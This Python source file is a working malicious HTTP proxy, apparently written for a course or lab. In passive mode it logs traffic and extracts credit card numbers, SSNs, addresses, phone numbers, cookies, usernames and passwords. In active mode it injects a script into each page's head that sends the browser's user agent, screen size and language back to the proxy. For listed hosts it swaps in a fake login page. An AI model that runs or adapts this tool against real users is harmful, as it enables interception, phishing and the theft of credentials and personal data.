import getopt
import gzip
import socket
import sys
import re

previous_host = ""  # Needed for POST requests

common_names = [  # List of the most common US names for men and women
    "James",
    "Mary",
    "Robert",
    "Patricia",
    "John",
    "Jennifer",
    "Michael",
    "Linda",
    "David",
    "Elizabeth",
    "William",
    "Barbara",
    "Richard",
    "Susan",
    "Joseph",
    "Jessica",
    "Thomas",
    "Sarah",
    "Christopher",
    "Karen",
    "Charles",
    "Lisa",
    "Daniel",
    "Nancy",
    "Matthew",
    "Betty",
    "Anthony",
    "Sandra",
    "Mark",
    "Margaret",
    "Donald",
    "Ashley",
    "Steven",
    "Kimberly",
    "Andrew",
    "Emily",
    "Paul",
    "Donna",
    "Joshua",
    "Michelle",
]

phishing_hosts = ["www.example.com"]  # List of the hosts for which we want to perform the phishing attack


def handle_connection(connection, data, address, mode, log, ip, port):

    global previous_host  # To modify it

    phishing = 0
    if data.find(b'Content-Encoding: gzip') == -1:
        print(data.decode())  # print for debugging
    else:
        parts = data.split(b'\r\n\r\n')  # \r\n may be due to the fact that I'm using a Mac. Alternatively, it can be
                                         # replaced with \n\n.
        header = parts[0].decode()
        body = gzip.decompress(parts[1])
        message = header + "\r\n\r\n" + body  # We convert the message into a binary message
        print(message)
    if len(data) == 0:  # There's nothing to do
        return

    lines = data.split(b'\r\n')

    if mode == "passive":
        log_request(data, lines, log, 0, 0)

    if mode == "active":
        if data.find(b'screen=') != -1 and data.find(b'user-agent=') != -1 and data.find(b'lang=') != -1:  # We log only the message with the relevant information
            log_injection(data, log)
            connection.close()
            return

    first_line = lines[0]  # First line of the request, i.e. GET ...

    url = first_line.split()[1]  # URL, i.e. the part after HTTP method

    http_pos = url.find(b'://')  # Find the position of ://
    if http_pos == -1:  # No http://, so directly the hostname
        tmp = url
    else:
        tmp = url[(http_pos + 3):]  # We go after ://

    port_pos = tmp.find(b':')  # We search for the port (if it exists)

    webserver_pos = tmp.find(b'/')  # Last position of the hostname
    if webserver_pos == -1:  # No /, so last position = length of the address
        webserver_pos = len(tmp)
    if port_pos == -1:
        request_port = 80  # No port, so default port: 80
        webserver = tmp[:webserver_pos]
    else:
        request_port = int((tmp[(port_pos + 1):])[:webserver_pos - port_pos - 1])
        webserver = tmp[:port_pos]
    if request_port == 443:
        print("We don't handle HTTPS (443)")  # I had to add it since I received some packets without https:// directed to port 443
        return
    if webserver.decode().strip() == "":  # For example, with POST first we send the header and then the data. In this way, also if we don't have an header we can correctly send the packet
        webserver = str.encode(previous_host)
    else:
        previous_host = webserver.decode()
    print("Making request to " + webserver.decode() + " on port {}".format(request_port))
    if webserver.decode() in phishing_hosts:  # We enable the phishing attack
        phishing = 1
    send_packet(webserver, request_port, connection, data, mode, log, ip, port, phishing)


def send_packet(webserver, port, conn, data, mode, log, ip, port_proxy, phishing):
    snd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # We create the socket for the packet
    snd_sock.connect((webserver, port))  # We connect to the host
    snd_sock.send(data)  # We send the data to the host

    encoded = 0
    first = 1
    end = 0

    while 1:
        reply = snd_sock.recv(8192)
        # To reduce the waiting time, when we find </html> (i.e. the last part of the page) we directly close the connection
        if reply.find(b'Content-Encoding: gzip') == -1:
            if reply.find(b'</html') != -1:
                end = 1
        else:
            tmp = gzip.decompress(reply.split(b'\r\n\r\n')[1])
            if tmp.find(b'</html') != -1:
                end = 1
        if len(reply) > 0:  # Until when we receive data, we send it back to the receiving host
            print(reply)
            if first and reply.find(b'Content-Encoding: gzip') != -1:  # The header tells us if the body is compressed
                encoded = 1
            if mode == "passive":
                log_request(reply, reply.split(b'\r\n'), log, encoded, first)
                if phishing:
                    reply = fake_login()  # We overwrite the packet after we logged it
            elif mode == "active":
                if phishing:
                    reply = fake_login()
                    encoded = 0  # We don't send it compressed
                reply = inject(reply, ip, port_proxy, encoded, first)

            conn.send(reply)  # We send the reply
            if first:
                first = 0  # We reset first
            if end:
                break
        else:
            break

    snd_sock.close()
    conn.close()


def log_request(data, lines, log, encoded, first):

    # First step: we obtain the string decoded

    if encoded == 0:
        decoded = data.decode()
    else:
        if first == 1:  # We must handle separately header and body
            parts = data.split(b'\r\n\r\n')
            header = parts[0].decode()
            body = gzip.decompress(parts[1]).decode()
            decoded = header + "\r\n\r\n" + body
        else:
            decoded = gzip.decompress(data).decode()

    print(decoded)


    credit_card = re.findall("[0-9]{4}(?:[- ]?[0-9]{4}){3}", decoded)
    for tmp in credit_card:
        log.write("Credit card found: " + tmp + "\n")

    ssn = re.findall("[^0-9][0-9]{3}[- ]?[0-9]{2}[- ]?[0-9]{4}[^0-9]", decoded)
    for tmp in ssn:
        log.write("SSN found: " + tmp[1:len(tmp) - 1] + "\n")

    addresses = re.findall(
        "[0-9]+(?:(?:\ |\+)[a-zA-Z\.]+)+(?:(?:\ |\+)street|court|ct\.|st\.|avenue|ave\.|boulevard|blvd\.|place|pl\.|road|rd\.|square|sq\.)(?:(?:\ |\+)[a-zA-Z\.]+)*",
        decoded, re.IGNORECASE)
    for tmp in addresses:
        log.write("Address found: " + tmp + "\n")

    phones = re.findall("(?:\+1)?(?:\ )?(?:(?:[0-9]{9})|(?:\([0-9]{3}\)[- ]?[0-9]{3}[- ]?[0-9]{4}))", decoded)
    for tmp in phones:
        log.write("Phone number found: " + tmp + "\n")

    for name in common_names:
        found = decoded.find(name)
        if found != -1:
            log.write("Name found: " + name + "\n")

    # OPTIONAL (not active): track also Set-cookies in responses

    # set_cookie = re.findall("Set\-Cookie\:\ [^\;]+", decoded)
    # for tmp in set_cookie:
    #     cookie = tmp.split(" ")[1]
    #     log.write("Set-Cookie found: " + cookie + "\n")

    cookie = re.findall("[^\-]Cookie\:\ [^\n]+", decoded)
    for tmp in cookie:
        cookie = tmp.split(" ")[1:]
        for c in cookie:
            log.write("Cookie found: " + c + "\n")

    for i in range(len(lines)):
        line = lines[i]
        check_login(line, log)  # We search for username/password on all lines


def check_login(line, log):
    username_pos = line.find(b'username=')
    if username_pos != -1:
        username_pos += 9  # We get the first character after password=
        tmp = line[username_pos:]
        next_parameter = tmp.find(b'&')  # We search for the next character
        if next_parameter == -1:
            next_parameter = len(tmp)

        username = tmp[:next_parameter]

        log.write("Username found: " + username.decode() + "\n")

    email_pos = line.find(b'email=')
    if email_pos != -1:
        email_pos += 6
        tmp = line[email_pos:]
        next_parameter = tmp.find(b'&')
        if next_parameter == -1:
            next_parameter = len(tmp)

        email = tmp[:next_parameter]

        log.write("Email found: " + email.decode() + "\n")

    password_pos = line.find(b'password=')
    if password_pos != -1:
        password_pos += 9
        tmp = line[password_pos:]
        next_parameter = tmp.find(b'&')
        if next_parameter == -1:
            next_parameter = len(tmp)

        password = tmp[:next_parameter]

        log.write("Password found: " + password.decode() + "\n")


def inject(reply, ip, port, encoded, first):

    if encoded == 1:
        if first == 1:
            parts = reply.split(b'\r\n\r\n')
            header = parts[0]
            body = gzip.decompress(parts[1])
            reply = header + b'\r\n\r\n' + body
        else:
            reply = gzip.decompress(reply)

    print(reply)

    head_pos = reply.find(b'<head>')  # We inject the script in head section

    if head_pos == -1:  # We wait for the packet with head, and we don't change the current one
        if encoded == 1:
            if first == 1:
                parts = reply.split(b'\r\n\r\n')
                header = parts[0]
                body = gzip.compress(parts[1])
                return header + b'\r\n\r\n' + body
            else:
                return gzip.compress(reply)
        else:
            return reply

    first_part = reply.split(b'<head>')[0]
    second_part = reply.split(b'<head>')[1]
    script = (b'<script type="text/javascript">\n\t\t\t'
              b'(async () => {const userAgent = navigator.userAgent;\n\t\t\t'
              b'const language = navigator.language;\n\t\t\t'
              b'const w = window.screen.width;\n\t\t\t'
              b'const h = window.screen.height;\n\t\t\t'
              b'console.log("Script executed!");\n\t\t\t'
              b'await fetch(`http://' + str.encode(ip + ":{}".format(port)) + b'/?user-agent=${userAgent}&screen=${w}x${h}&lang=${language}`, {method: "GET",});})()\n\t\t'
              b'</script>\n\t\t')

    content_length_match = re.search(b'Content-Length: (\d+)', first_part)  # We must change content length
    if content_length_match:
        if encoded == 1:
            new_content_length = len(gzip.compress(script + b'' + body))  # We get the new length
            first_part = re.sub(b'Content-Length: \d+', str.encode("Content-Length: {}".format(new_content_length)), first_part)  # We replace the length
        else:
            original_content_length = int(content_length_match.group(1))
            new_content_length = original_content_length + len(script)
            first_part = re.sub(b'Content-Length: \d+', str.encode("Content-Length: {}".format(new_content_length)), first_part)

    injected = first_part + b'<head>' + script + second_part

    # We recompose the packet

    if encoded == 1:
        if first == 1:
            parts = injected.split(b'\r\n\r\n')
            print(parts)
            injected = parts[0] + b'\r\n\r\n'
            for i in range(1, len(parts)):
                injected += gzip.compress(parts[i])
        else:
            injected = gzip.compress(reply)

    print(injected)

    return injected  # We return the injected packet


def log_injection(data, log):

    decoded = data.decode()
    tmp = re.findall("user-agent=[^&]+", decoded)[0]
    agent = tmp.split("=")[1]
    log.write("User agent: " + agent + "\n")
    tmp = re.findall("screen=[^&]+", decoded)[0]
    screen = tmp.split("=")[1]
    log.write("Screen resolution: " + screen + "\n")
    tmp = re.findall("lang=[^ ]+", decoded)[0]
    lang = tmp.split("=")[1]
    log.write("Language: " + lang + "\n")

    print("\n\nLog completed!\n\n")

def fake_login():
    html_code = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Login Page</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background-color: #f4f4f4;
          margin: 0;
          padding: 0;
          display: flex;
          align-items: center;
          justify-content: center;
          height: 100vh;
        }

        form {
          background-color: #ffffff;
          padding: 20px;
          border-radius: 8px;
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
          width: 300px;
          text-align: center;
        }

        label {
          display: block;
          margin-bottom: 8px;
          font-weight: bold;
        }

        input {
          width: 100%;
          padding: 8px;
          margin-bottom: 16px;
          box-sizing: border-box;
          border: 1px solid #ccc;
          border-radius: 4px;
        }

        button {
          background-color: #4caf50;
          color: white;
          padding: 10px 15px;
          border: none;
          border-radius: 4px;
          cursor: pointer;
        }

        button:hover {
          background-color: #45a049;
        }
      </style>
    </head>
    <body>
      <form>
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>

        <button type="submit">Login</button>
      </form>
    </body>
    </html>
    """

    body = str.encode(html_code)  # We get the body in binary format

    packet = ((b'HTTP/1.1 200 OK\n'
              b'Content-Type: text/html; charset=UTF-8\n') + str.encode("Content-Length: {}\n".format(len(body))) +
              b'\r\n\r\n') + body

    return packet


opts, args = getopt.getopt(sys.argv[1:], "m:")  # We get the CLI arguments
for opt, arg in opts:
    if opt == "-m":
        mode = arg  # We store the mode

ip = sys.argv[3]
port = sys.argv[4]

log = ''

# We open the proper log file

if mode == "passive":
    log = open("info_1.txt", "w")
if mode == "active":
    log = open("info_2.txt", "w")
rcv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # We create the receiving socket
rcv_sock.bind((ip, int(port)))
rcv_sock.listen(10)
while True:
    try:
        (connection, address) = rcv_sock.accept()  # Accept connection from client browser
        data = connection.recv(8192)  # Receive client data
        handle_connection(connection, data, address, mode, log, ip, port)
    except KeyboardInterrupt:  # Used to close the file and the socket
        log.close()
        rcv_sock.close()
        print("Exit")
        sys.exit(0)
